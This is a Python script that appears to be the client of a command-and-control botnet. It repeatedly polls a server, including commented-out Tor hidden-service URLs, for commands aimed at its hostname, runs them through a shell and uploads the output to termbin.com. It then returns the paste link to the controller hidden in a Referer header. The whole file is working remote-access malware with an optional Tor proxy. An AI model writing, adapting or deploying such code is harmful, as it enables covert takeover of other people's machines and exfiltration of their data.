#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import requests
import re
import socket
import time
from colorama import *

# cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html'
# cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'
cmd_url_order = 'http://192.168.1.24:5000/'
cmd_url_answer = 'http://192.168.1.24:5000/answer'
hostname = socket.gethostname()
hostname_pattern = 'host:%s-00' % hostname
headers = {}
referer = {'Referer': hostname_pattern}
cache_control = {'Cache-Control': 'no-cache'}
headers.update(referer)
headers.update(cache_control)
check_cmd_1 = None

def recvall(sock, n):
  data = b''
  while len(data) < n:
    packet = sock.recv(n - len(data))
    if not packet:
      return None
    data += packet
  return data


def get_cmd():
    req = requests.get(cmd_url_order, headers=headers).content.decode().strip()
    if req == '':
        pass
    else:
        return req

def run_cmd(cmd):
    cmd_split = cmd.split('--')
    if cmd_split[1] == hostname:
        cmd = cmd_split[2]
        print(cmd)
        run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()
        out = run.stdout.read()
        if not out:
            out = b'ok'
        # termbin_cnx = socks.socksocket() # TORPROXY
        termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True) # TORPROXY
        termbin_cnx.connect(('termbin.com', 9999))
        termbin_cnx.send(out)
        recv = termbin_cnx.recv(100000)
        termbin_url_created = recv.decode().rstrip('\x00').strip()
        print(termbin_url_created)
        termbin_header = {'Referer': hostname_pattern+" -- "+termbin_url_created}
        headers.update(termbin_header)
        try:
            push = requests.get(cmd_url_answer, headers=headers)
            print('executed')
            headers.update(referer)
        except Exception as e:
            print(e)
            pass
    else:
        print('not for me')
       
while True:
    time.sleep(5)
    try:
        check_cmd = get_cmd()
        # print("%s <=> %s" % (check_cmd, check_cmd_1))
        if check_cmd != check_cmd_1 and type(check_cmd) != None :
            # print("[+] Commande à envoyer : " + str(check_cmd))
            time.sleep(2)
            run_cmd(check_cmd)
            check_cmd_1 = check_cmd
            # print("[!] Commande executée, consultez le dashboard")
            pass
    except Exception as e:
        print(e)
        pass